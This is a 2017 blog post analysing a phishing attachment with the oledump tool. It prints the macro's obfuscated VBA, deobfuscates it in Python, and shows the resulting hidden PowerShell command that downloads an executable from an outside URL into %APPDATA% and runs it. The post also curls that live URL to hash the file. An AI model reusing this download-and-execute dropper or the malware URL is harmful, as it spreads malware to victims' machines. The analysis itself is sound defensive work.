---
layout: post
title:  "Analyzing maldocs with oledump"
date:   2017-01-29 07:00:00
comments: true
categories: reversing security malware macros
---


I always worked for the red team but as I was going through my spam folder this morning I decided I'd give a try at analyzing malicious attachments. I also secretly always wanted to check out Didier Stevens' [oledump](https://blog.didierstevens.com/programs/oledump-py/) tool so this was a good excuse :)

#### E-mail

The mail looked like this:

{% highlight text %}
Date: Fri, 27 Jan 2017 12:26:06 +0100
From: Mihail <hunter@puppetlabs.com>
To: contact@quentinkaiser.be
Subject: question
Reply-To: Mihail <AdamBuchbinder@tutanota.com>
X-Mailer: Microsoft Windows Live Mail 14.0.8117.416
Message-ID: <1CE6AE0E2AFED033EFEAA3140087FFB0@sh>

Hey. I found your software is online. Can you write the code for my project?
Terms of reference attached below.
The price shall discuss, if you can make. Answer please.
{% endhighlight %}

The attachment is a file named "New.gz" allegedly containing the "Terms of reference" Mihail is talking about.

#### Malicious attachment fingerprinting

So let's dive in ! I launched a VM and ran some basic checks on the file. `binwalk` told us that the file is actually a RAR archive, even though the extension says `.gz`

{% highlight sh %}
$ binwalk New.gz 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             RAR archive data, first volume type: MAIN_HEAD
{% endhighlight %}

The archive contains a document named `New.doc`, apparently a Microsoft Office document:

{% highlight sh %}
$ file New.doc 
New.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1251, Template: Normal, Last Saved By: Normal, Revision Number: 2, Name of Creating Application: Microsoft Office Word, Create Time/Date: Fri Jan 27 05:14:00 2017, Last Saved Time/Date: Fri Jan 27 05:14:00 2017, Number of Pages: 1, Number of Words: 0, Number of Characters: 5, Security: 0
{% endhighlight %}

#### Malicious attachment analysis

I can finally try oledump !

{% highlight sh %}
$ python oledump.py -i New.doc
1:       114 '\x01CompObj'
2:      4096 '\x05DocumentSummaryInformation'
3:      4096 '\x05SummaryInformation'
4:     11555 '1Table'
5:       367 'Macros/PROJECT'
6:        41 'Macros/PROJECTwm'
7: M   84985 'Macros/VBA/ThisDocument'
8:     16765 'Macros/VBA/_VBA_PROJECT'
9:       517 'Macros/VBA/dir'
10:       216 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Item'
11:       341 'MsoDataStore/\xc3\x90O\xc3\x904\xc3\x91\xc3\x9f\xc3\x84\xc3\x80\xc3\x84\xc3\x840\xc3\x9fLKL\xc3\x95CGFI\xc3\x89A==/Properties'
12:     15974 'WordDocument'
{% endhighlight %}

We can see that there is a VBA macro on stream 7, let's extract it with oledump:

{% highlight sh %}
$ python oledump.py -s 7 -v New.doc > payload.vba
{% endhighlight %}

The VBA payload contains a shit load of "obfuscated" code but we can find the interesting part by pinpointing where the call to `Shell` happens. We can see in the excerpt below that the argument provided to `Shell` is a concatenation of the `sraqteby` array elements. Yes, there are some array indexing bullshit. I doubt this ever made reversing difficult :D

{% highlight vbnet %}
sraqteby = Array("CM", "D.", "ex", "e ", "/C", " """, "po", "We", "^R", "sH", "^E", "^l", "L.", "EX", "^e", "  ", "  ", " ^", "-e", "XE", "^C", "UT", "^I", "^o", "^n", "^P", "o^", "LI", "^C", "y ", "by", "p^", "As", "^s", "^ ", "  ", " ^", "-N", "^O", "pr", "^O", "^F", "i^", "l^", "e ", "-^", "wi", "nD", "ow", "ST", "^y", "LE", "^ ", "  ", " h", "^I", "Dd", "en", "  ", " ^", "(n", "^e", "^W", "-O", "^b", "je", "^C", "T^", "  ", "  ", "s^", "yS", "te", "^M", "^.", "^N", "ET", ".W", "^E",
"b^", "cL", "i^", "En", "^T", "^)", "^.", "^d", "OW", "^N", "l^", "oa", "^d", "^F", "I^", "lE", "('", "ht", "tp", ":/", "/n", "ic", "kl", "ov", "eg", "ro", "ve", ".c", "o.", "uk", "/w", "p-", "co", "nt", "en", "t/", "ma", "rg", "in", "26", "01", "_o", "ne", "ch", "at", "_w", "or", "d.", "ex", "e'", ",'", "%A", "PP", "dA", "ta", "%.", "Ex", "e'", ");", "s^", "TA", "rT", "-p", "RO", "^C", "^E", "s^", "S ", "'%", "AP", "pd", "aT", "a%", ".E", "xE", "'""")

ozqaqzusw = Array("odevzu", "qvonwav", "ohizef", "decaqo", "azxut", Join(sraqteby, ""), "irtubgu")(5)


eratcyke = ucbejja & ubep & ogyl
zema2 = rbipole & scivikwo & ynehsoc & qhyxob
vnilden3 = ejveme & omvyrzi & ezeln & nrezi
uhysylhi = ycijt & yzowr & olec
orybm5 = uzsygip & uhyhges & rmyle
mufqim = wnisofmo & nukag
ywgodyr = Array(mufqim, orybm5, uhysylhi, vnilden3, zema2, Shell(Array(ozqaqzusw)(0), 0), eratcyke)(5)
{% endhighlight %}

I opened a Python interpreter and executed the code below to get the argument provided to `Shell`:

{% highlight python %}
a = ["CM", "D.", "ex", "e ", "/C", " """, "po", "We", "^R", "sH", "^E", "^l", "L.", "EX", "^e", "  ", "  ", " ^", "-e", "XE", "^C", "UT", "^I", "^o", "^n", "^P", "o^", "LI", "^C", "y ", "by", "p^", "As", "^s", "^ ", "  ", " ^", "-N", "^O", "pr", "^O", "^F", "i^", "l^", "e ", "-^", "wi", "nD", "ow", "ST", "^y", "LE", "^ ", "  ", " h", "^I", "Dd", "en", "  ", " ^", "(n", "^e", "^W", "-O", "^b", "je", "^C", "T^", "  ", "  ", "s^", "yS", "te", "^M", "^.", "^N", "ET", ".W", "^E", "b^", "cL", "i^",
 "En", "^T", "^)", "^.", "^d", "OW", "^N", "l^", "oa", "^d", "^F", "I^", "lE", "('", "ht", "tp", ":/", "/n", "ic", "kl", "ov", "eg", "ro", "ve", ".c", "o.", "uk", "/w", "p-", "co", "nt", "en", "t/", "ma", "rg", "in", "26", "01", "_o", "ne", "ch", "at", "_w", "or", "d.", "ex", "e'", ",'", "%A", "PP", "dA", "ta", "%.", "Ex", "e'", ");", "s^", "TA", "rT", "-p", "RO", "^C", "^E", "s^", "S ", "'%", "AP", "pd", "aT", "a%", ".E", "xE"]

print  "".join(a).replace("^", "")
{% endhighlight %}

Which gave me the following one-liner that downloads an executable with PowerShell and executes it (URL escapes are mine):

```
"CMD.exe /C poWeRsHElL.EXe     -eXECUTIonPoLICy bypAss    -NOprOFile -winDowSTyLE    hIDden   (neW-ObjeCT    sySteM.NET.WEbcLiEnT).dOWNloadFIlE('http://nicklovegrove[.]co[.]uk/wp-content/margin2601_onechat_word.exe','%APPdAta%.Exe');sTArT-pROCEsS '%APpdaTa%.ExE"
```

Let's hash it !

{% highlight sh %}
$ curl http://nicklovegrove.co.uk/wp-content/margin2601_onechat_word.exe | sha1sum
0df45a365e2135531b0beba8e50d0453eee70047
{% endhighlight %}

Submitting the hash to [VirusTotal](https://www.virustotal.com/en/file/3f73b09d9cdd100929061d8590ef0bc01b47999f47fa024f57c28dcd660e7c22/analysis), we can see it's already detected as a Trojan by some AV. Some analyst provided the download URL in comments.


That's all for now, I'm not good enough at reversing Windows executables to go further :)
